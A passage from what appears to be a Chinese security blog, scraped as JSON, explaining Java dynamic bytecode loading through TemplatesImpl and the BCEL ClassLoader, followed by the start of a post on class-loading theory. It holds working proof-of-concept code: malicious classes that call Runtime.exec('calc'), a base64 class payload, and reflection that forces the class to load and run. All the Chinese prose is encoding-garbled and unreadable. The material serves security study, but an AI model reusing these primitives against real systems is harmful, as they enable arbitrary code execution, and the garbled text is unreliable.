TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) {//è¿™é‡Œè¦æ±‚_transletIndexä¸èƒ½å°äº0 ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } åœ¨è¿™ä¸ªä»£ç ä¸­ï¼Œè™½ç„¶æˆ‘ä»¬åœ¨å‰é¢ä¸ºäº†ç¬¦åˆæ¡ä»¶å°†_classèµ‹å€¼ä¸ºäº†nullï¼Œä½†æ˜¯åœ¨defineTransletClasses()æ–¹æ³•ä¸­é‡æ–°å¯¹è¿™ä¸ª_classèµ‹å€¼äº†ï¼š\nè¿™é‡Œä¸å¤šè¯´ã€‚åé¢å°±æ‡‚äº†ã€‚ç„¶åçœ‹ä¸‹é¢è¿™éƒ¨åˆ†ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) {//è¿™é‡Œè¦æ±‚_transletIndexä¸èƒ½å°äº0 ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } è¿™é‡Œ_transletIndexä¸èƒ½å°äº0ï¼Œå¹¶ä¸”åœ¨å‰é¢å¯ä»¥çœ‹åˆ°èµ‹å€¼è¯­å¥ï¼š\n1 _transletIndex = i; è¿™é‡Œåˆšå¥½ä¸å‰é¢çš„_class[_transletIndex]ç›¸å¯¹åº”ï¼Œå¹¶ä¸”ä»€ä¹ˆï¼Œå‰é¢çš„ä»£ç é€»è¾‘ä¹Ÿå®Œå…¨ç¬¦åˆï¼Œå¦‚ä¸‹ï¼š\nä¹Ÿå°±æ˜¯è¯´å…ˆè°ƒç”¨äº†defineTransletClasses()æ–¹æ³•ï¼Œè®©_classä¸å†ä¸ºnullï¼Œæ‰€ä»¥å¯ä»¥æœ‰å€¼ã€‚\nä¹Ÿå°±æ˜¯å¯ä»¥ç†è§£ä¸ºåªè¦æ¡ä»¶æ»¡è¶³ï¼Œ_bytecodeså¯¹åº”çš„ä»£ç éƒ½ä¼šä¼ ç»™_class[i]ï¼Œä¹Ÿå°±æ˜¯_class[_transletIndex],ç„¶åå°±ä¼šå†å¯¹è¿™ä¸ªç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™æ ·å°±å¯ä»¥æˆåŠŸè¿è¡Œã€‚ç°åœ¨æ¥çœ‹ç»™è¿™ä¸ªèµ‹å€¼çš„ifçš„æ¡ä»¶è¯­å¥ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } å†çœ‹ _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); æ‰€ä»¥è¿™é‡Œå°±éœ€è¦_bytecodes[i]çš„çˆ¶ç±»éœ€è¦ä¸ºAbstractTransletæ‰è¡Œ\n1 2 private static String ABSTRACT_TRANSLET = \u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; æ‰€ä»¥ä½¿ç”¨çš„POC:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } è¿™é‡Œä¸ºä»€ä¹ˆè¦å¤šä¸¤ä¸ªtransformæ–¹æ³•ï¼ŒåŸå› å¦‚ä¸‹;\n1 2 3 4 5 è¿™é‡Œæ˜¯å› ä¸ºå­ç±»éœ€è¦å®ç°çˆ¶ç±»é‡Œé¢çš„æŠ½è±¡æ–¹æ³•ï¼ŒåŒæ—¶å› ä¸ºçˆ¶ç±»æ˜¯æŠ½è±¡ç±»ï¼Œå¯èƒ½æ²¡æœ‰å°†æ¥å£çš„æ–¹æ³•å…¨éƒ¨å®ç°ï¼Œ è¿™æ—¶å­ç±»å¦‚æœä¸æ˜¯æŠ½è±¡çš„ï¼Œé‚£å¿…é¡»å°†å…¶ä»–æ¥å£æ–¹æ³•éƒ½å®ç°ã€‚ è¿™é‡Œé¢ transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) æ˜¯çˆ¶ç±»é‡Œé¢çš„æŠ½è±¡æ–¹æ³•æ‰€ä»¥è¦é‡å†™ transform(DOM document, SerializationHandler[] handlers)æ˜¯çˆ¶ç±»æ²¡æœ‰å®ç°æ¥å£çš„æ–¹æ³•æ‰€ä»¥è¦é‡å†™ æœ€ç»ˆçš„POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main { public static void main(String[] args) throws Exception { byte[] bytecodes = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAWTGphdmFfZm91bmRhdGlvbi9UZXh0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAmAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJVGV4dC5qYXZhDAAHAAgHACcMACgAKQEABGNhbGMMACoAKwEAFGphdmFfZm91bmRhdGlvbi9UZXh0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAACgAEAAsADQAMAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAADwALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAA4AAAAEAAEAFgABABAAFwACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEgALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABgAGQACAAAAAQAaABsAAwAOAAAABAABABYAAQAcAAAAAgAd\u0026#34;); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytecodes}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); mpl.newTransformer(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } è™½ç„¶æŠ¥é”™ï¼Œä½†æ˜¯æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\næŠ¥é”™æ˜¯æ­£å¸¸çš„ï¼Œå› ä¸ºæœ¬æ¥æ„é€ å‡ºæ¥çš„åŠ¨æ€åŠ è½½å­—èŠ‚ç å°±ä¼šå¯¼è‡´åŸæœ‰é€»è¾‘è¢«ç ´åï¼Œæ‰€ä»¥æ˜¯è‚¯å®šä¼šæŠ¥é”™çš„ã€‚ä½†è¾¾åˆ°äº†æœ€ç»ˆç›®çš„ã€‚\né‚£ä¹ˆç°åœ¨æˆ‘ä»¬æ¥å°è¯•ä¸€ä¸‹åˆ©ç”¨é‚£ä¸ªpublicä¿®é¥°ç¬¦çš„æ–¹æ³•ï¼Œå³getTransletIndexï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } è¿™é‡Œä¹Ÿæ˜¯åªéœ€è¦_classå˜é‡ä¸ºnullå³å¯ï¼Œç°åœ¨å°±ç»§ç»­è·ŸdefineTransletClasses()ï¼Œä½†æ˜¯è¿™é‡Œå°±æœ‰ä¸ªé—®é¢˜ï¼Œæ— æ³•å®ä¾‹åŒ–ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ²¡æœ‰åˆ©ç”¨åˆ°è¿™ä¸ªçš„åŸå› ã€‚\nç»§ç»­æ€è€ƒï¼Œæ˜¯ç§æœ‰æ–¹æ³•ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨åå°„æ¥è·å–ï¼Œå› ä¸ºTemplatesImplç±»æœ‰ä¸€ä¸ªæ— å‚çš„å…¬å…±çš„æ„é€ æ–¹æ³•ï¼Œå°è¯•æ„é€ ä¸€ä¸‹\nå¼¹è®¡ç®—æœºä»£ç ä¸å˜ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Text extends AbstractTranslet { public Text() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaå˜ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //å¯¹è±¡+getClass() package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\java_foundation\\\\Text.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); Method method = ctf.getClass().getDeclaredMethod(\u0026#34;getTransletInstance\u0026#34;); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); method.setAccessible(true); method.invoke(ctf);//ä½†æ˜¯å…¶å®åœ¨æ ¹æœ¬ä¸Šæ²¡æœ‰å˜åŒ–ï¼Œéƒ½æ˜¯åœ¨getTransletInstanceæ–¹æ³•è¿™é‡Œå®ä¾‹åŒ–ï¼Œæ²¡åŠæ³•ï¼Œåªæœ‰è¿™é‡Œæ¥æ”¶åˆ°äº†defineClass()è¿”å›çš„ç±»ï¼Œè¿™é‡Œæ‰èƒ½å®ä¾‹åŒ– } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } å…¶ä»–å°±ä¸å¤šè¯´äº†ã€‚\nåˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç  å…³äºBCELå¯ä»¥å…ˆçœ‹çœ‹Pç¥çš„æ–‡ç« ï¼šhttps://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x01-bcel\nåœ¨Java 8u251çš„æ›´æ–°ä¸­ï¼Œè¿™ä¸ªClassLoaderè¢«ç§»é™¤äº†ï¼Œç®€å•äº†è§£ä¸€ä¸‹ã€‚è¿™é‡Œç”¨JDK7çœ‹ä¸€ä¸‹\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nBCELå…¨åæ˜¯Apache Commoms BCELï¼Œå±äºApache Commomsé¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ã€‚\nBCELåº“æä¾›äº†ä¸€ç³»åˆ—ç”¨äºåˆ†æã€åˆ›å»ºã€ä¿®æ”¹Java Classæ–‡ä»¶çš„APIã€‚å®ƒå¾ˆç‰¹æ®Šçš„ç‚¹åœ¨å®ƒè¢«åŒ…å«åœ¨äº†åŸç”Ÿçš„JDKä¸­ï¼Œä½äºcom.sun.org.apache.bcelä¸­ã€‚\nBCELåŒ…ä¸­æœ‰ä¸ªæœ‰è¶£çš„ç±»com.sun.org.apache.bcel.internal.util.ClassLoaderï¼Œä»–æ˜¯ä¸€ä¸ªClassLoaderï¼Œä½†æ˜¯ä»–é‡å†™äº†Javaå†…ç½®çš„ClassLoader#loadClass()æ–¹æ³•ï¼Œå»çœ‹ä¸€ä¸‹æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 protected Class loadClass(String class_name, boolean resolve) throws ClassNotFoundException { Class cl = null; /* First try: lookup hash table. */ if((cl=(Class)classes.get(class_name)) == null) { /* Second try: Load system class using system class loader. You better * don\u0026#39;t mess around with them. */ for(int i=0; i \u0026lt; ignored_packages.length; i++) { if(class_name.startsWith(ignored_packages[i])) { cl = deferTo.loadClass(class_name); break; } } if(cl == null) { JavaClass clazz = null; /* Third try: Special request? */ if(class_name.indexOf(\u0026#34;$$BCEL$$\u0026#34;) \u0026gt;= 0) clazz = createClass(class_name); else { // Fourth try: Load classes via repository if ((clazz = repository.loadClass(class_name)) != null) { clazz = modifyClass(clazz); } else throw new ClassNotFoundException(class_name); } if(clazz != null) { byte[] bytes = clazz.getBytes(); cl = defineClass(class_name, bytes, 0, bytes.length);//è¿™é‡Œè°ƒç”¨äº†defineClassæ–¹æ³• } else // Fourth try: Use default class loader cl = Class.forName(class_name); } if(resolve) resolveClass(cl); } classes.put(class_name, cl); return cl; } å…¶ä¸­è°ƒç”¨çš„æ˜¯defineClass()æ–¹æ³•\n1 2 3 4 if(clazz != null) { byte[] bytes = clazz.getBytes(); cl = defineClass(class_name, bytes, 0, bytes.length);//è¿™é‡Œè°ƒç”¨äº†defineClassæ–¹æ³• } çœ‹ä»£ç ï¼Œè¿™é‡Œå°±éœ€è¦éœ€è¦BCELå­—èŠ‚ç çš„å¼€å¤´ä¸º$$BCEL$$ï¼Œç”¨createClassæ–¹æ³•è·å–ç±»çš„Classå¯¹è±¡ä»è€Œå¯ä»¥èµ‹å€¼ç»™clazzã€‚\n1 2 if(class_name.indexOf(\u0026#34;$$BCEL$$\u0026#34;) \u0026gt;= 0) clazz = createClass(class_name); ç®€å•æ¢³ç†ä¸€ä¸‹è¿‡ç¨‹ï¼Œé¦–å…ˆå°±æ˜¯è®¾ç½®clä¸ºnull\nç„¶ååœ¨ä¸‹é¢è¿™ä¸ªæ¡ä»¶è¯­å¥åˆ¤æ–­å¼€å¤´æœ‰æ²¡æœ‰è¿™ä¸ªä¸œè¥¿ï¼Œå¦‚æœæœ‰ï¼Œå°±ä½¿ç”¨createClass()æ–¹æ³•æ¥å¯¹è±¡å¹¶èµ‹å€¼ç»™clazzï¼Œå…·ä½“å®ç°å¯ä»¥è‡ªå·±å»çœ‹æºä»£ç ï¼ˆåœ¨createClassæ–¹æ³•å†…å°±å·²ç»å°†BCELå½¢å¼çš„å­—èŠ‚ç è½¬æ¢æˆJavaClasså¯¹è±¡äº†ï¼‰\næ­¤æ—¶clazzä¸ä¸ºnullï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥åˆ°ä¸‹é¢è¿™ä¸ªè¯­å¥\nè¿™é‡Œå°±ä¼šè°ƒç”¨åˆ°defeineClass()æ–¹æ³•äº†ï¼Œå†åœ¨è¿™é‡Œé¢å¾—åˆ°ç±»çš„Classå­—èŠ‚ç ï¼Œæœ€ç»ˆè·å¾—ç±»å¯¹è±¡clå¹¶returnäº†å›å»ã€‚\næµç¨‹å·²ç»åŸºæœ¬æ¸…æ¥šï¼Œé‚£ä¹ˆå¦‚ä½•åˆ©ç”¨å‘¢ï¼Œå¦‚ä¸‹ï¼š\nåœ¨BCELä¸­ï¼Œå®ƒæä¾›äº†Utilityå’ŒRepositoryç±»\nå…¶ä¸­Repositoryæä¾›äº†lookupClassæ–¹æ³•ç”¨äºåŠ è½½ä¸€ä¸ªç±»\nUtilityç±»æä¾›äº†ä¸€ä¸ªencodeæ–¹æ³•ç”¨äºå°†JavaClasså¯¹è±¡è½¬æ¢æˆBCELå½¢å¼çš„å­—èŠ‚ç \n1 String code = Utility.encode(clazz.getBytes(), true); å†ç”¨BCEL ClassLoaderè¿›è¡ŒåŠ è½½\n1 new ClassLoader().loadClass(\u0026#34;$$BCEL$$\u0026#34; + code).newInstance();//è¿™é‡Œå°±æ˜¯ç®€å•çš„å®ä¾‹åŒ–å¯¹è±¡åçš„å¯¹ä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨ æ•´åˆä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åˆ©ç”¨\nç¼–å†™æ¶æ„ç±»ï¼š\n1 2 3 4 5 6 //Test.java public class Test{ static { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.util.ClassLoader; public class Main { public static void main(String[] args) throws Exception { JavaClass clazz = Repository.lookupClass(Test.class); String code = Utility.encode(clazz.getBytes(), true); System.out.println(code); new ClassLoader().loadClass(\u0026#34;$$BCEL$$\u0026#34; + code).newInstance(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\nä»£ç ä¸ºä»€ä¹ˆè¦è¿™æ ·æ„é€ å…¶å®å·²ç»æ¯”è¾ƒæ¸…æ¥šäº†ï¼Œå¯ä»¥è‡ªå·±æƒ³æƒ³æµç¨‹æ¥å¯¹æ¯”ä¸€ä¸‹ã€‚\nè¿˜æœ‰çš„å°±æ˜¯è¿™é‡ŒJDK7è¿è¡Œéœ€è¦æ”¹ideaçš„é…ç½®ï¼Œä¸ºäº†èƒ½æµ‹è¯•æˆåŠŸæ”¹äº†ï¼Œä½†æ˜¯åé¢åˆæ”¹å›æ¥äº†ï¼Œåˆšå¥½é˜²æ­¢è‡ªå·±å¿˜ï¼Œå¯ä»¥å‚è€ƒæ–‡ç« æ¥æ”¹ï¼šhttps://blog.csdn.net/weixin_46001244/article/details/108601584\n","date":"2024-06-23T21:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/","title":"åŠ¨æ€åŠ è½½å­—èŠ‚ç "},{"content":"Javaç±»åŠ è½½æœºåˆ¶ JVMï¼ˆjavaè™šæ‹Ÿæœºï¼‰æŠŠæè¿°ç±»çš„æ•°æ®ä»Classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶å¯¹æ•°æ®è¿›è¡Œæ ¡éªŒã€è§£æå’Œåˆå§‹åŒ–ï¼Œæœ€ç»ˆå½¢æˆå¯ä»¥è¢«è™šæ‹Ÿæœºç›´æ¥ä½¿ç”¨çš„Javaç±»å‹ï¼Œè¿™å°±æ˜¯è™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶ã€‚\nJavaç±» Javaæ˜¯ç¼–è¯‘å‹è¯­è¨€ï¼Œæˆ‘ä»¬ç¼–å†™çš„javaæ–‡ä»¶éœ€è¦è¢«ç¼–è¯‘æˆclassæ–‡ä»¶åæ‰èƒ½è¢«JVMè¿è¡Œï¼Œè¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹javaç±»ã€‚\nç»™ä¸€ä¸ªMain.javaï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 public class Main{ public static void main(String[] args){ System.out.println(\u0026#34;haha\u0026#34;); } } ä½¿ç”¨javacå‘½ä»¤å°†å…¶ç¼–è¯‘ä¸ºå­—èŠ‚ä»£ç çš„classæ–‡ä»¶ï¼Œç»“æœå¦‚ä¸‹ï¼š\nè¿™æ ·å°±ç”Ÿæˆäº†ä¸€ä¸ªå­—èŠ‚ç æ–‡ä»¶ ï¼Œç”¨åå…­è¿›åˆ¶å·¥å…·æ‰“å¼€çœ‹ä¸€ä¸‹\nè¿™é‡Œå°±å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„å­—èŠ‚ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡JDKè‡ªå¸¦çš„javapå‘½ä»¤åæ±‡ç¼–Main.classæ–‡ä»¶å¯¹åº”çš„Mainç±»ï¼Œ\nJVMåœ¨æ‰§è¡ŒMainä¹‹å‰ä¼šå…ˆè§£æclassäºŒè¿›åˆ¶å†…å®¹ï¼ŒJVMæ‰§è¡Œçš„å…¶å®å°±æ˜¯å¦‚ä¸Šjavapå‘½ä»¤ç”Ÿæˆçš„å­—èŠ‚ç ã€‚\nç±»åŠ è½½çš„æ—¶æœº ï¼ˆå…·ä½“å¯å‚è€ƒã€Šæ·±å…¥ç†è§£Javaè™šæ‹Ÿæœºã€‹ä¸€ä¹¦ï¼‰\nç±»åŠ è½½è¿‡ç¨‹å¦‚ä¸‹è¡¨ç¤ºï¼š\nå…¶ä¸­ ä»éªŒè¯åˆ°è§£æ ä¸ºè¿æ¥ï¼Œ ä»åŠ è½½åˆ°åˆå§‹åŒ– ä¸ºç±»åŠ è½½\nåŠ è½½ åŠ è½½è¿‡ç¨‹ï¼š\né€šè¿‡ç±»çš„å…¨é™å®šåï¼ˆåŒ…å+ç±»åï¼‰æ¥è·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµ å°†è¿™ä¸ªå­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬åŒ–ä¸ºè¿è¡Œæ—¶çš„æ•°æ®ç»“æœ åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™ä¸ªç±»çš„å„ç§æ•°æ®çš„è®¿é—®å…¥å£ æ ¡éªŒ è¿™ä¸€é˜¶æ®µçš„ç›®çš„æ˜¯ä¸ºäº†ç¡®ä¿Classæ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œå¹¶ä¸”ä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«çš„å®‰å…¨ã€‚ä»æ•´ä½“ä¸Šçœ‹ï¼ŒéªŒè¯é˜¶æ®µå¤§è‡´ä¸Šä¼šå®Œæˆ4ä¸ªé˜¶æ®µçš„æ ¡éªŒå·¥ä½œï¼šæ–‡ä»¶æ ¼å¼ã€å…ƒæ•°æ®ã€å­—èŠ‚ç ã€ç¬¦å·å¼•ç”¨ã€‚å¯ä»¥é€šè¿‡è®¾ç½®å‚æ•°ç•¥è¿‡ã€‚\nå‡†å¤‡ å‡†å¤‡é˜¶æ®µæ˜¯æ­£å¼ä¸ºç±»ä¸­å®šä¹‰çš„å˜é‡ï¼ˆå³é™æ€å˜é‡\u0026ndash;è¢«staticä¿®é¥°çš„å˜é‡ï¼‰åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡åˆå§‹å€¼çš„é˜¶æ®µã€‚\nè¿™é‡Œéœ€è¦æ³¨æ„çš„ç‚¹ï¼š\næ­¤æ—¶è¿›è¡Œå†…å­˜åˆ†é…çš„ä»…åŒ…æ‹¬ç±»å˜é‡ï¼ˆé™æ€å˜é‡ï¼‰ï¼Œè€Œä¸åŒ…æ‹¬å®ä¾‹å˜é‡ï¼Œå®ä¾‹å˜é‡å°†ä¼šåœ¨å¯¹è±¡å®ä¾‹åŒ–æ—¶éšç€å¯¹è±¡ä¸€èµ·åˆ†é…åœ¨Javaå †ä¸­ã€‚ ä¹Ÿå°±æ˜¯è¯´ç±»å˜é‡éšç€ç±»çš„åŠ è½½ä¸ºå­˜åœ¨äºæ–¹æ³•åŒº\nå…¶æ¬¡å°±æ˜¯è¿™é‡Œè¯´çš„åˆå§‹å€¼â€œé€šå¸¸æƒ…å†µâ€ä¸‹æ˜¯æ•°æ®ç±»å‹çš„é›¶å€¼ï¼Œæ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š public satic int value = 123;ï¼Œåœ¨å‡†å¤‡é˜¶æ®µè¿‡åçš„åˆå§‹å€¼ä¸º0è€Œä¸æ˜¯123ã€‚æŠŠvalueèµ‹å€¼ä¸º123çš„æŒ‡ä»¤åœ¨åˆå§‹åŒ–é˜¶æ®µæ‰ä¼šè¢«æ‰§è¡Œã€‚\nä½†æ˜¯åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µï¼Œå¦‚æœç±»å˜é‡åŒæ—¶è¢«staticå’Œfinalä¿®é¥°ï¼Œæ¯”å¦‚ï¼š\npublic static final int value = 123;\né‚£ä¹ˆåœ¨å‡†å¤‡é˜¶æ®µè™šæ‹Ÿæœºå°±ä¼šå°†valueèµ‹å€¼ä¸º123ï¼Œå¹¶ä¸”åœ¨å®šä¹‰è¿™ä¸ªå˜é‡çš„æ—¶å€™å¿…é¡»ä¸ºå…¶æ˜¾å¼çš„èµ‹å€¼ã€‚\nè§£æ è§£æé˜¶æ®µæ˜¯Javaè™šæ‹Ÿæœºå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹\nç¬¦å·å¼•ç”¨å°±æ˜¯ä¸€ç»„ç¬¦å·æ¥æè¿°ç›®æ ‡ï¼Œå¯ä»¥æ˜¯ä»»ä½•å­—é¢é‡ã€‚ ç›´æ¥å¼•ç”¨å°±æ˜¯ç›´æ¥æŒ‡å‘ç›®æ 